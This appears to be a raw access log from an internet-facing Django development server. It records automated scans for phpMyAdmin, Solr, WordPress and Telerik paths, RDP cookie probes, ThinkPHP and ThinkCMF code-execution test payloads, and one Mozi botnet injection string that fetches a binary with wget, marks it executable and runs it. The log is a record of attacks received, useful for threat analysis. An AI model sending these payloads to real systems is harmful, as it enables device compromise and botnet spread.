[20/Oct/2020 12:49:25] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 179
[20/Oct/2020 12:53:30] "GET http://150.158.7.54/ab2h HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 40257)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 13:04:34] "GET http://150.158.7.54/ab2g HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('101.89.19.140', 62161)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 13:16:47] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('116.128.128.41', 55554)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 14:45:55] "GET / HTTP/1.1" 200 643
[20/Oct/2020 15:20:06] "GET / HTTP/1.1" 200 643
[20/Oct/2020 15:29:20] "GET http://150.158.7.54/phpmyadmin/index.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('58.247.212.239', 54729)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 15:54:44] "GET / HTTP/1.1" 200 643
[20/Oct/2020 16:52:50] "GET http://150.158.7.54/index.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 53114)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 16:58:35] "GET /hudson HTTP/1.1" 404 179
[20/Oct/2020 17:56:42] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[20/Oct/2020 17:56:42] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[20/Oct/2020 18:01:54] "GET / HTTP/1.1" 200 643
[20/Oct/2020 18:28:03] "GET http://150.158.7.54/phpmyadmin/scripts/setup.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 62059)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 19:09:11] "GET / HTTP/1.1" 200 643
[20/Oct/2020 19:22:05] "GET / HTTP/1.1" 200 643
[20/Oct/2020 19:32:00] "GET / HTTP/1.0" 200 643
[20/Oct/2020 20:37:21] "GET / HTTP/1.1" 200 643
[20/Oct/2020 20:48:00] "GET / HTTP/1.0" 200 643
[20/Oct/2020 21:13:15] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
[20/Oct/2020 21:13:15] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
[20/Oct/2020 21:14:56] "GET /ReportServer HTTP/1.1" 404 179
[20/Oct/2020 21:20:00] "HEAD /robots.txt HTTP/1.0" 404 179
[20/Oct/2020 21:32:38] "GET / HTTP/1.1" 200 643
[20/Oct/2020 22:02:21] "GET / HTTP/1.1" 200 643
[20/Oct/2020 22:10:21] "GET / HTTP/1.1" 200 643
[20/Oct/2020 22:10:24] "GET / HTTP/1.1" 200 643
[20/Oct/2020 23:03:22] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[20/Oct/2020 23:03:22] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[20/Oct/2020 23:54:49] "GET http://150.158.7.54//PMA/scripts/setup.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('183.192.179.16', 56937)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 23:56:09] "GET http://150.158.7.54//phpmyadmin/scripts/setup.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('183.192.179.16', 36529)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 23:57:07] code 400, message Bad request syntax ('\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf\x159 X\xd4>\x12\x98\xc4<¨¤\x13\xcf\x00\xac\xa09¡Á\x90#8~\x8c\xde\x9dReF\xbf%1Q¨¤\x9d\x06&g\xbb\x82\x95\x19¨ª\x07\x14\x19ZP\x80+\x94e\xc3\xe6\x85\x06¡è\x99\x8b\x19l\x01¨º\x88Y\x91\x16\x95\xc4\xc8\x0eH\x02\xc7\x93g\xc14FW\x05|\xfb¨®T\xb8\xfd\xcb\xbb)\xe3\xce\xdd\xcd7\x9e\xefP\x8c¡è[V\xfd\x98\xc9l\x82\xf5\xe4\xc1d\x87X¡Â\x9b\xbf¨¨q\x12\x99&\xdb,\xf5\x87¡Á¡§\x97j;\xe3¨º¡ì\xb4¡ã\x02\xad\x8dE\x9b\xaaB\x80\x0e)\xa9¨¦\xaf}\x18\x8e\xb8\x1e\x99\x04\xef¡§\x8c¨¨\x04\xe2\xd3¨ª)1\x91\xc1\x8f\x88\x8c\x81\xf0\xdb\xa5\x88\x95H\x9bZ\xab\xce\xbf\xf4E%P*\x88KFY6\x9e\xe7::j\xd4\x8a¡§V\x9a\xaa\xab\xaf\xc3&.¨ª[\x04\xc5e\x7f\x08\xbe\x8ar¡ì¡ã\x99F¡Â\x11\xe5\xd6\x96\x8cIm+w\x1c\xfduU\x14\x0f!x\xac¨¨MPy\xc3\x19!2\xa0¨ª\xc0}!Rw\x14\x8e\x1b\xc4¨¢\xa0\xaf+\xadKk\xc5¨¤\\s\x9c\xbd\xcb')
[20/Oct/2020 23:57:07] "\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf9 X\xd4>\x98\xc4<¨¤\xcf \xac\xa09¡Á\x90#8~\x8c\xde\x9dReF\xbf%1Q¨¤\x9d&g\xbb\x82\x95¨ªZP\x80+\x94e\xc3\xe6\x85¡è\x99\x8bl¨º\x88Y\x91\x95\xc4\xc8H\xc7\x93g\xc14FW|\xfb¨®T\xb8\xfd\xcb\xbb)\xe3\xce\xdd\xcd7\x9e\xefP\x8c¡è[V\xfd\x98\xc9l\x82\xf5\xe4\xc1d\x87X¡Â\x9b\xbf¨¨q\x99&\xdb,\xf5\x87¡Á¡§\x97j;\xe3¨º¡ì\xb4¡ã\xad\x8dE\x9b\xaaB\x80)\xa9¨¦\xaf}\x8e\xb8\x99\xef¡§\x8c¨¨\xe2\xd3¨ª)1\x91\xc1\x8f\x88\x8c\x81\xf0\xdb\xa5\x88\x95H\x9bZ\xab\xce\xbf\xf4E%P*\x88KFY6\x9e\xe7::j\xd4\x8a¡§V\x9a\xaa\xab\xaf\xc3&.¨ª[\xc5e\xbe\x8ar¡ì¡ã\x99F¡Â\xe5\xd6\x96\x8cIm+w\xfduU!x\xac¨¨MPy\xc3!2\xa0¨ª\xc0}!Rw\x8e\xc4¨¢\xa0\xaf+\xadKk\xc5¨¤\s\x9c\xbd\xcb" 400 -
[21/Oct/2020 00:04:43] "GET http://150.158.7.54//mysql/scripts/setup.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('58.247.212.239', 48674)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[21/Oct/2020 00:12:13] code 400, message Bad request version ('\xc0\x14\xc0')
[21/Oct/2020 00:12:13] You're accessing the development server over HTTPS, but it only supports HTTP.

[21/Oct/2020 00:19:20] "GET / HTTP/1.1" 200 643
[21/Oct/2020 00:19:22] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('61.219.11.153', 61915)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[21/Oct/2020 01:00:38] "GET http://150.158.7.54//dbadmin/scripts/setup.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('116.128.128.41', 52418)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[21/Oct/2020 01:01:12] "GET / HTTP/1.1" 200 643
[21/Oct/2020 01:14:00] "GET / HTTP/1.1" 200 643
[21/Oct/2020 01:16:24] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[21/Oct/2020 01:16:24] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[21/Oct/2020 01:27:58] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 179
[21/Oct/2020 01:28:00] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 179
[21/Oct/2020 01:45:26] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 643
[21/Oct/2020 01:59:11] "GET / HTTP/1.1" 200 643
[21/Oct/2020 02:09:57] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 179
[21/Oct/2020 02:09:57] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 179
[21/Oct/2020 02:09:58] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 179
[21/Oct/2020 02:09:58] "GET /pma/scripts/setup.php HTTP/1.1" 404 179
[21/Oct/2020 02:09:59] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 179
[21/Oct/2020 02:09:59] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 179
[21/Oct/2020 02:10:01] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 643
[21/Oct/2020 02:16:15] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 179
[21/Oct/2020 02:21:19] code 400, message Bad request syntax ('\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf\x159 X\xd4>\x12\x98\xc4<¨¤\x13\xcf\x00\xac\xa09¡Á\x90#8~\x8c\xde\x9dReF\xbf%1Q¨¤\x9d\x06&g\xbb\x82\x95\x19¨ª\x07\x14\x19ZP\x80+\x94e\xc3\xe6\x85\x06¡è\x99\x8b\x19l\x01¨º\x88Y\x91\x16\x95\xc4\xc8\x0eH\x02\xc7\x93g\xc14FW\x05|\xfb¨®T\xb8\xfd\xcb\xbb)\xe3\xce\xdd\xcd7\x9e\xefP\x8c¡è[V\xfd\x98\xc9l\x82\xf5\xe4\xc1d\x87X¡Â\x9b\xbf¨¨q\x12\x99&\xdb,\xf5\x87¡Á¡§\x97j;\xe3¨º¡ì\xb4¡ã\x02\xad\x8dE\x9b\xaaB\x80\x0e)\xa9¨¦\xaf}\x18\x8e\xb8\x1e\x99\x04\xef¡§\x8c¨¨\x04\xe2\xd3¨ª)1\x91\xc1\x8f\x88\x8c\x81\xf0\xdb\xa5\x88\x95H\x9bZ\xab\xce\xbf\xf4E%P*\x88KFY6\x9e\xe7::j\xd4\x8a¡§V\x9a\xaa\xab\xaf\xc3&.¨ª[\x04\xc5e\x7f\x08\xbe\x8ar¡ì¡ã\x99F¡Â\x11\xe5\xd6\x96\x8cIm+w\x1c\xfduU\x14\x0f!x\xac¨¨MPy\xc3\x19!2\xa0¨ª\xc0}!Rw\x14\x8e\x1b\xc4¨¢\xa0\xaf+\xadKk\xc5¨¤\\s\x9c\xbd\xcb')
[21/Oct/2020 02:21:19] "\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf9 X\xd4>\x98\xc4<¨¤\xcf \xac\xa09¡Á\x90#8~\x8c\xde\x9dReF\xbf%1Q¨¤\x9d&g\xbb\x82\x95¨ªZP\x80+\x94e\xc3\xe6\x85¡è\x99\x8bl¨º\x88Y\x91\x95\xc4\xc8H\xc7\x93g\xc14FW|\xfb¨®T\xb8\xfd\xcb\xbb)\xe3\xce\xdd\xcd7\x9e\xefP\x8c¡è[V\xfd\x98\xc9l\x82\xf5\xe4\xc1d\x87X¡Â\x9b\xbf¨¨q\x99&\xdb,\xf5\x87¡Á¡§\x97j;\xe3¨º¡ì\xb4¡ã\xad\x8dE\x9b\xaaB\x80)\xa9¨¦\xaf}\x8e\xb8\x99\xef¡§\x8c¨¨\xe2\xd3¨ª)1\x91\xc1\x8f\x88\x8c\x81\xf0\xdb\xa5\x88\x95H\x9bZ\xab\xce\xbf\xf4E%P*\x88KFY6\x9e\xe7::j\xd4\x8a¡§V\x9a\xaa\xab\xaf\xc3&.¨ª[\xc5e\xbe\x8ar¡ì¡ã\x99F¡Â\xe5\xd6\x96\x8cIm+w\xfduU!x\xac¨¨MPy\xc3!2\xa0¨ª\xc0}!Rw\x8e\xc4¨¢\xa0\xaf+\xadKk\xc5¨¤\s\x9c\xbd\xcb" 400 -
[21/Oct/2020 02:50:34] "GET / HTTP/1.1" 200 643
[21/Oct/2020 02:57:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[21/Oct/2020 02:57:59] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[21/Oct/2020 03:24:28] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('91.166.0.102', 37397)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[21/Oct/2020 03:25:43] "GET http://150.158.7.54//webdav/wickd.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 36402)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[21/Oct/2020 03:26:56] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 179
[21/Oct/2020 03:26:56] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 179
[21/Oct/2020 03:26:57] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 179
[21/Oct/2020 03:26:57] "GET /pma/scripts/setup.php HTTP/1.1" 404 179
[21/Oct/2020 03:26:57] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 179
[21/Oct/2020 03:26:58] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 179
[21/Oct/2020 04:00:31] "GET http://150.158.7.54/muieblackcat HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('58.247.212.239', 56592)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[21/Oct/2020 04:05:16] code 400, message Bad request syntax ('\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf\x159 X\xd4>\x12\x98\xc4<¨¤\x13\xcf\x00\xac\xa09¡Á\x90#8~\x8c\xde\x9dReF\xbf%1Q¨¤\x9d\x06&g\xbb\x82\x95\x19¨ª\x07\x14\x19ZP\x80+\x94e\xc3\xe6\x85\x06¡è\x99\x8b\x19l\x01¨º\x88Y\x91\x16\x95\xc4\xc8\x0eH\x02\xc7\x93g\xc14FW\x05|\xfb¨®T\xb8\xfd\xcb\xbb)\xe3\xce\xdd\xcd7\x9e\xefP\x8c¡è[V\xfd\x98\xc9l\x82\xf5\xe4\xc1d\x87X¡Â\x9b\xbf¨¨q\x12\x99&\xdb,\xf5\x87¡Á¡§\x97j;\xe3¨º¡ì\xb4¡ã\x02\xad\x8dE\x9b\xaaB\x80\x0e)\xa9¨¦\xaf}\x18\x8e\xb8\x1e\x99\x04\xef¡§\x8c¨¨\x04\xe2\xd3¨ª)1\x91\xc1\x8f\x88\x8c\x81\xf0\xdb\xa5\x88\x95H\x9bZ\xab\xce\xbf\xf4E%P*\x88KFY6\x9e\xe7::j\xd4\x8a¡§V\x9a\xaa\xab\xaf\xc3&.¨ª[\x04\xc5e\x7f\x08\xbe\x8ar¡ì¡ã\x99F¡Â\x11\xe5\xd6\x96\x8cIm+w\x1c\xfduU\x14\x0f!x\xac¨¨MPy\xc3\x19!2\xa0¨ª\xc0}!Rw\x14\x8e\x1b\xc4¨¢\xa0\xaf+\xadKk\xc5¨¤\\s\x9c\xbd\xcb')
[21/Oct/2020 04:05:16] "\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf9 X\xd4>\x98\xc4<¨¤\xcf \xac\xa09¡Á\x90#8~\x8c\xde\x9dReF\xbf%1Q¨¤\x9d&g\xbb\x82\x95¨ªZP\x80+\x94e\xc3\xe6\x85¡è\x99\x8bl¨º\x88Y\x91\x95\xc4\xc8H\xc7\x93g\xc14FW|\xfb¨®T\xb8\xfd\xcb\xbb)\xe3\xce\xdd\xcd7\x9e\xefP\x8c¡è[V\xfd\x98\xc9l\x82\xf5\xe4\xc1d\x87X¡Â\x9b\xbf¨¨q\x99&\xdb,\xf5\x87¡Á¡§\x97j;\xe3¨º¡ì\xb4¡ã\xad\x8dE\x9b\xaaB\x80)\xa9¨¦\xaf}\x8e\xb8\x99\xef¡§\x8c¨¨\xe2\xd3¨ª)1\x91\xc1\x8f\x88\x8c\x81\xf0\xdb\xa5\x88\x95H\x9bZ\xab\xce\xbf\xf4E%P*\x88KFY6\x9e\xe7::j\xd4\x8a¡§V\x9a\xaa\xab\xaf\xc3&.¨ª[\xc5e\xbe\x8ar¡ì¡ã\x99F¡Â\xe5\xd6\x96\x8cIm+w\xfduU!x\xac¨¨MPy\xc3!2\xa0¨ª\xc0}!Rw\x8e\xc4¨¢\xa0\xaf+\xadKk\xc5¨¤\s\x9c\xbd\xcb" 400 -
[21/Oct/2020 04:10:17] "GET / HTTP/1.1" 200 643
[21/Oct/2020 04:13:52] "POST /editBlackAndWhiteList HTTP/1.1" 404 179
[21/Oct/2020 04:33:23] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[21/Oct/2020 04:33:23] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[21/Oct/2020 04:48:56] "GET / HTTP/1.1" 200 643
[21/Oct/2020 04:55:49] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('101.89.19.140', 37331)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[21/Oct/2020 05:10:47] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[21/Oct/2020 05:10:47] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[21/Oct/2020 05:11:12] code 400, message Bad request syntax ('\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf\x159 X\xd4>\x12\x98\xc4<¨¤\x13\xcf\x00\xac\xa09¡Á\x90#8~\x8c\xde\x9dReF\xbf%1Q¨¤\x9d\x06&g\xbb\x82\x95\x19¨ª\x07\x14\x19ZP\x80+\x94e\xc3\xe6\x85\x06¡è\x99\x8b\x19l\x01¨º\x88Y\x91\x16\x95\xc4\xc8\x0eH\x02\xc7\x93g\xc14FW\x05|\xfb¨®T\xb8\xfd\xcb\xbb)\xe3\xce\xdd\xcd7\x9e\xefP\x8c¡è[V\xfd\x98\xc9l\x82\xf5\xe4\xc1d\x87X¡Â\x9b\xbf¨¨q\x12\x99&\xdb,\xf5\x87¡Á¡§\x97j;\xe3¨º¡ì\xb4¡ã\x02\xad\x8dE\x9b\xaaB\x80\x0e)\xa9¨¦\xaf}\x18\x8e\xb8\x1e\x99\x04\xef¡§\x8c¨¨\x04\xe2\xd3¨ª)1\x91\xc1\x8f\x88\x8c\x81\xf0\xdb\xa5\x88\x95H\x9bZ\xab\xce\xbf\xf4E%P*\x88KFY6\x9e\xe7::j\xd4\x8a¡§V\x9a\xaa\xab\xaf\xc3&.¨ª[\x04\xc5e\x7f\x08\xbe\x8ar¡ì¡ã\x99F¡Â\x11\xe5\xd6\x96\x8cIm+w\x1c\xfduU\x14\x0f!x\xac¨¨MPy\xc3\x19!2\xa0¨ª\xc0}!Rw\x14\x8e\x1b\xc4¨¢\xa0\xaf+\xadKk\xc5¨¤\\s\x9c\xbd\xcb')
